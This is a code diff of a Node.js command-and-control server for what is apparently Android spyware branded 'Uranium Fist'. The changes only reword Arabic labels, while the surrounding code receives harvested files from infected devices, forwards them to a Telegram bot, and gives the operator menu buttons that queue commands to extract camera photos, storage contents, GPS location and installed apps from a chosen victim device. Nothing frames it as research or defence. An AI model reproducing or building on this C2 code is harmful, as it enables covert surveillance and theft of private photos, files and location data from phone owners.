@@ -44,7 +44,7 @@ async function sendTg(msg, options = {}) {
 }
 
 app.get('/', (req, res) => {
-    res.status(200).send(`<html><body style="background:#111;color:#ff5500;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE ONLINE [☢️️]</h1></body></html>`);
+    res.status(200).send(`<html><body style="background:#111;color:#ff5500;font-family:monospace;text-align:center;padding-top:50px;"><h1>[☢️] URANIUM FIST C2 CORE ONLINE [☢️]</h1></body></html>`);
 });
 
 app.post('/api/v3/uranium/upload_raw', async (req, res) => {
@@ -70,7 +70,7 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
             await sendTg(`⚠️ <b>الملف كبير جداً (${fileSizeMB.toFixed(2)} MB):</b> يتجاوز حد تيليجرام (50MB)، تم حفظه بأمان في خزنة اليورانيوم.`);
         } else {
             await appBot.sendDocument(chatId, finalPath, { 
-                caption: `☢️ <b>قبضة اليورانيوم - أرشيف الحصاد الشامل:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
+                caption: `☢️ <b>قبضة اليورانيوم - حصاد البرق:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
             });
         }
 
@@ -99,7 +99,7 @@ app.post('/api/v3/uranium/stream', async (req, res) => {
 
         if (payload.type === 'TEXT_REPORT') {
             const textData = payload.data || '';
-            if (textData.includes('خطأ') || textData.includes('Error') || textData.includes('فشل') || textData.includes('بنجاح') || textData.includes('LOCATION') || textData.includes('APPS') || textData.includes('HARVEST') || textData.includes('DOWNLOAD') || textData.includes('الفحص')) {
+            if (textData.includes('خطأ') || textData.includes('Error') || textData.includes('فشل') || textData.includes('بنجاح') || textData.includes('LOCATION') || textData.includes('APPS') || textData.includes('HARVEST') || textData.includes('DOWNLOAD') || textData.includes('البرق')) {
                 await sendTg(`☢️ <b>تقرير قبضة اليورانيوم [<code>${nodeId}</code>]:</b>\n<pre>${textData.substring(0, 3500)}</pre>`);
             }
         }
@@ -132,7 +132,7 @@ appBot.on('message', async (msg) => {
                 inlineKeyboard.push([{ text: `☢️ ${node.model} (${node.id.substring(0, 6)})`, callback_data: `menu_${node.id}` }]);
             });
 
-            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم المطلقة:</b>\nاختر العقدة المستهدفة للدمار الشامل:`, {
+            await sendTg(`☢️ <b>غرفة قيادة قبضة اليورانيوم البرقية:</b>\nاختر العقدة المستهدفة للسيطرة الفورية:`, {
                 reply_markup: { inline_keyboard: inlineKeyboard }
             });
         });
@@ -148,11 +148,11 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '☢️ حصاد الكاميرا الشامل (ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '☢️ حصاد الكاميرا البرقي (ZIP)', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
                     { text: '📥 سحب Download والتخزين الشامل', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                 ],
                 [
-                    { text: '📍 تحديد الموقع (GPS)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
+                    { text: '📍 تحديد الموقع (GPS فوري)', callback_data: `cmd_EXTRACT_LOCATION_${nodeId}` },
                     { text: '📱 التطبيقات المثبتة', callback_data: `cmd_EXTRACT_APPS_${nodeId}` }
                 ],
                 [
@@ -178,8 +178,8 @@ appBot.on('callback_query', async (query) => {
         const action = parts.slice(1).join('_');
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
-            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق أمر قبضة اليورانيوم [${action}] بنجاح!` });
-            await sendTg(`🔥 <b>أمر قبضة اليورانيوم [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
+            await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق أمر قبضة اليورانيوم [${action}] بسرعة البرق!` });
+            await sendTg(`⚡ <b>أمر قبضة اليورانيوم [<code>${action}</code>] قيد التنفيذ الخارق للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
